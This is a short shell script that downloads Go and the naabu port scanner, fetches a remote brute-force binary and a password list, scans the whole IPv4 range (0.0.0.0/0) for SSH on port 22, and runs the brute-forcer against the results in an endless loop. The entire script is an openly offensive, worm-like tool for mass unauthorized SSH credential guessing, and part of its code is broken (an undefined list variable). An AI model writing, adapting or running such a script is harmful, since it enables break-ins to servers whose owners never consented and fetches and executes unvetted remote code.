#ATILA_VKZMN


#abaixa brute golang naabu






go_url='https://go.dev/dl/go1.26.5.linux-amd64.tar.gz'
url_naabu='https://github.com/projectdiscovery/naabu/archive/refs/tags/v2.6.1.tar.gz'
url_brutus='https://github.com/atilabyte/golang/raw/refs/heads/master/brute' #my tool of brute force very simple




brute() {

cd /var/tmp/naabu-2.6.1/cmd/naabu

wget $url_brutus  -O   brutus || curl -L $url_brutus  -o  brutus #install brutus
wget $creds  -O  lista.txt   || curl -L  $creds  -o lista.txt  #list of pass  && users 

chmod  +x brutus 

timeout  5s     ./nabu  -p 22    -host    0.0.0.0/0     >    ips_nabu  #ssh


grep -v "^127\." ips_nabu >  ips.txt

 
timeout  5s  ./brutus 

 


}













#############################################################################

install_(){
 
out=$( ls /var/tmp/naabu-2.6.1/cmd/naabu/nabu ) #verify if nabu instaled
 

 if (( ! $? )) ; then

 echo nabu ja instalado

  brute



else

cd /var/tmp

wget $go_url  -O go.gz || curl -L $go_url  -o  go.gz #install go 

wget $url_naabu  -O naabu.gz  || curl -L $url_naabu -o naabu.gz #install naabu

tar -xf go.gz && tar -xf naabu.gz

cd  naabu-2.6.1/cmd/naabu ; mv main.go nabu.go

../../../go/bin/go build  nabu.go  #compile nabu


fi;


}


while true ; do



install_




done 
